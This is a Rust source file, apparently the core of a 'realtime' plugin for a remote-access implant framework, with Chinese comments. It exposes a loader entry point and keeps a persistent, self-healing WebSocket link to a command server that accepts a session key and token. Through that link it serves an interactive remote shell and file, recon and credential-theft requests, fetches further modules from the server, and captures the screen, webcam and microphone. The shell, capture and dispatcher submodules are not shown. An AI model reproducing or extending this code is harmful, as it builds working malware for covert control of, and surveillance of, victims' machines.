//! realtime 模块（官方插件仓库）：WS 实时通道 + 交互式 Shell + 屏幕/摄像头/麦克风。
//!
//! 架构（本体零 WS）：agent 本体只保留 HTTP AI 通道与任务轮询；WS 的全部
//! 能力（交互式终端、文件/系统/凭据等 WS 请求-响应、屏幕/摄像头/麦克风流）
//! 由本模块提供。agent 心跳响应 wsNeeded=true 时下载并启动本模块，模块
//! 自建 WebSocket 连接（/ws/realtime?channel=）并接管所有 WS 消息处理；
//! wsNeeded=false 时停止。模块内存常驻，断线自愈重连。
//!
//! ABI（与 libra-load 共享）：
//! ```text
//! unsafe extern "system" fn module_main(input, input_len, output, output_cap) -> usize
//! ```
//!
//! Input JSON:
//! ```json
//! {"action":"start",
//!  "wsUrl":"ws://host/ws/realtime?channel=xxx",
//!  "agentId":"...","sessionKey":"<b64 AES-256>","sessionToken":"...",
//!  "serverUrl":"http://host:5270","registerPath":"/api"}
//! {"action":"stop"}
//! {"action":"screenshot","quality":"medium"}
//! {"action":"webcam","index":0}
//! ```

#![allow(non_snake_case)]
#![allow(clippy::upper_case_acronyms)]

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;

pub mod capture;
mod dispatcher;
mod module_mgr;
mod shell;
mod streams;
mod utils;
mod ws;

/// 模块自述名（libra-load 自识别校验用）。
#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("realtime", "\0").as_ptr() as *const u8
}

// ── 全局运行状态（模块内存常驻，进程生命周期内有效）──────────────────

static RT: Mutex<Option<std::sync::Arc<tokio::runtime::Runtime>>> = Mutex::new(None);
static STOP: AtomicBool = AtomicBool::new(false);

/// WS 服务循环的共享状态（等价于原 engine::EngineShared）。
pub(crate) struct SharedState {
    pub agent_id: String,
    pub shell_session: tokio::sync::Mutex<Option<shell::ShellSession>>,
    pub screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
    pub camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
}

/// 启动参数（agent 心跳 wsNeeded=true 时下发）。
#[derive(Clone)]
struct StartConfig {
    ws_url: String,
    agent_id: String,
    session_key: Option<[u8; 32]>,
    session_token: String,
    server_url: String,
    register_path: String,
}

/// 模块入口：按 action 分发。
#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };

    let result = run(&input_json);
    let bytes = result.as_bytes();
    let n = bytes.len().min(output_cap);
    std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n);
    n
}

fn run(input_json: &str) -> String {
    let v: serde_json::Value = match serde_json::from_str(input_json) {
        Ok(v) => v,
        Err(e) => return serde_json::json!({ "error": format!("bad input: {e}") }).to_string(),
    };
    let action = v["action"].as_str().unwrap_or("");

    match action {
        "start" => start(v),
        "stop" => stop(),
        "screenshot" => {
            let quality = v["quality"].as_str().unwrap_or("medium");
            capture::ScreenCapture::capture(quality, None)
        }
        "webcam" => {
            let idx = v["index"].as_u64().unwrap_or(0) as u32;
            capture::CameraCapture::capture(idx)
        }
        _ => serde_json::json!({ "error": format!("unknown action '{action}'") }).to_string(),
    }
}

/// 启动 WS 服务循环（幂等：已启动直接返回 started）。
fn start(v: serde_json::Value) -> String {
    if RT.lock().unwrap().is_some() {
        return serde_json::json!({ "status": "started", "idempotent": true }).to_string();
    }

    let ws_url = v["wsUrl"].as_str().unwrap_or("").to_string();
    let agent_id = v["agentId"].as_str().unwrap_or("").to_string();
    let session_token = v["sessionToken"].as_str().unwrap_or("").to_string();
    let server_url = v["serverUrl"].as_str().unwrap_or("").to_string();
    let register_path = v["registerPath"].as_str().unwrap_or("/api/beacon/register").to_string();
    let session_key = v["sessionKey"]
        .as_str()
        .and_then(|s| base64::Engine::decode(&base64::engine::general_purpose::STANDARD, s).ok())
        .and_then(|b| <[u8; 32]>::try_from(b).ok());

    if ws_url.is_empty() || agent_id.is_empty() {
        return serde_json::json!({ "error": "missing wsUrl/agentId" }).to_string();
    }

    let cfg = StartConfig {
        ws_url,
        agent_id,
        session_key,
        session_token,
        server_url,
        register_path,
    };

    STOP.store(false, Ordering::SeqCst);
    let rt = match tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
    {
        Ok(r) => r,
        Err(e) => return serde_json::json!({ "error": format!("runtime: {e}") }).to_string(),
    };
    let rt = std::sync::Arc::new(rt);

    let rt2 = rt.clone();
    std::thread::spawn(move || {
        rt2.block_on(ws_service_loop(cfg));
    });

    *RT.lock().unwrap() = Some(rt);
    serde_json::json!({ "status": "started" }).to_string()
}

/// 停止 WS 服务循环（下次 start 可重启）。
fn stop() -> String {
    STOP.store(true, Ordering::SeqCst);
    if let Some(rt) = RT.lock().unwrap().take() {
        // block_on 线程会在 WS 循环退出后结束；runtime 随 Arc 释放。
        drop(rt);
    }
    serde_json::json!({ "status": "stopped" }).to_string()
}

// ── WS 服务循环（模块自有 runtime 上运行）────────────────────────────

async fn ws_service_loop(cfg: StartConfig) {
    // 会话状态
    let shared = std::sync::Arc::new(SharedState {
        agent_id: cfg.agent_id.clone(),
        shell_session: tokio::sync::Mutex::new(None),
        screen_session: std::sync::Mutex::new(None),
        camera_session: std::sync::Mutex::new(None),
    });

    // 内嵌模块管理器：WS 消息里的 file/recon/creds 等模块从这里下载。
    let mm = std::sync::Arc::new(tokio::sync::Mutex::new(module_mgr::ModuleManager::new(
        &cfg.server_url,
        &cfg.register_path,
        &cfg.register_path,
        &cfg.register_path,
        cfg.agent_id.clone(),
        cfg.session_key,
        Some(cfg.session_token.clone()),
    )));

    let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<libra_common::protocol::WebSocketMessage>();

    let mut ws = ws::WsCommunicator::new(&cfg.ws_url, &cfg.agent_id);
    if let Some(k) = cfg.session_key {
        ws.set_session_key(k);
    }
    let tx = ws.sender();

    let mut ping = tokio::time::interval(std::time::Duration::from_secs(15));
    ping.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    ping.tick().await;

    // 常驻循环：连接 → 处理 → 断线自愈
    loop {
        if STOP.load(Ordering::SeqCst) {
            break;
        }

        // 连接（最多 3 次尝试）
        let mut connected = false;
        for i in 0..3 {
            if ws.connect().await.is_ok() {
                connected = true;
                break;
            }
            if i < 2 {
                tokio::time::sleep(std::time::Duration::from_secs(2)).await;
            }
        }
        if !connected {
            libra_common::dlog!("[realtime] ws connect failed — retrying in 5s");
            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            continue;
        }
        libra_common::dlog!("[realtime] ws connected");

        // 已连接：处理消息直到断开或 stop
        loop {
            if STOP.load(Ordering::SeqCst) {
                break;
            }
            tokio::select! {
                Some(msg) = shell_rx.recv() => {
                    ws::send_msg_via(&tx, &msg).await;
                }
                _ = ping.tick() => {
                    tx.send_ping().await;
                }
                result = tokio::time::timeout(std::time::Duration::from_millis(50), ws.receive()) => {
                    match result {
                        Ok(Some(msg)) => {
                            let s = shared.clone();
                            let msg_tx = tx.clone();
                            let msg_shell_tx = shell_tx.clone();
                            let mm2 = mm.clone();
                            tokio::spawn(async move {
                                dispatcher::dispatch(&s, &msg_tx, &msg_shell_tx, &mm2, msg).await;
                            });
                        }
                        Ok(None) => {
                            libra_common::dlog!("[realtime] ws disconnected");
                            ws.close().await;
                            break;
                        }
                        Err(_) => {}
                    }
                }
            }
        }

        // 断开后短暂等待再重连
        if !STOP.load(Ordering::SeqCst) {
            tokio::time::sleep(std::time::Duration::from_secs(3)).await;
        }
    }
    libra_common::dlog!("[realtime] ws service loop exited");
}
